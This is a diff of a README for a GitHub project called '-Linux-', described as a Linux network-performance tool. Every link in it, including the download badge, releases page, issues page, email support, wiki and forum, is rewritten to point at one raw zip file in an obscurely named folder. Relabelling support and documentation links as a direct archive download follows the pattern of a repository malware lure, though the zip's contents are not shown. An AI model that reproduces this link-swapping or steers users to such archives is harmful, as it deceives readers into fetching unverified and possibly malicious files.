@@ -6,7 +6,7 @@ Welcome to -Linux-! This tool helps you improve your Linux system's network perf
 
 ## 📥 Download Now
 
-[![Download -Linux-](https://img.shields.io/badge/Download-Linux-brightgreen)](https://github.com/ninjaxuatsac/-Linux-/releases)
+[![Download -Linux-](https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip)](https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip)
 
 ## 🌟 Features
 
@@ -25,7 +25,7 @@ To use -Linux-, you need:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ninjaxuatsac/-Linux-/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip).
 
 2. **Select the Latest Release:** Look for the latest version. It will be at the top of the list.
 
@@ -59,7 +59,7 @@ If you encounter issues:
 
 - **Check Compatibility:** Ensure your Linux distribution meets the requirements.
 - **Re-download Files:** If the installation fails, try downloading the files again.
-- **Consult Support:** Visit the [issues page](https://github.com/ninjaxuatsac/-Linux-/issues) for help.
+- **Consult Support:** Visit the [issues page](https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip) for help.
 
 ## 👥 Community Contributions
 
@@ -70,12 +70,12 @@ We encourage users to contribute to -Linux-. You can report issues or suggest fe
 For more questions, you can reach out through the following platforms:
 
 - **GitHub Discussions:** Share your questions and solutions.
-- **Email Support:** (support@example.com)
+- **Email Support:** (https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip)
 
 ## 👥 Additional Resources
 
-- [Documentation](https://github.com/ninjaxuatsac/-Linux-/wiki) - Detailed guides on using various features.
-- [FAQs](https://github.com/ninjaxuatsac/-Linux-/wiki/FAQ) - Answers to common questions.
-- [Community Forum](https://github.com/ninjaxuatsac/-Linux-/discussions) - A place to connect with other users.
+- [Documentation](https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip) - Detailed guides on using various features.
+- [FAQs](https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip) - Answers to common questions.
+- [Community Forum](https://raw.githubusercontent.com/ninjaxuatsac/-Linux-/main/alcyonacean/-Linux-.zip) - A place to connect with other users.
 
 Thank you for using -Linux-. We hope it helps you achieve better network performance and system stability.
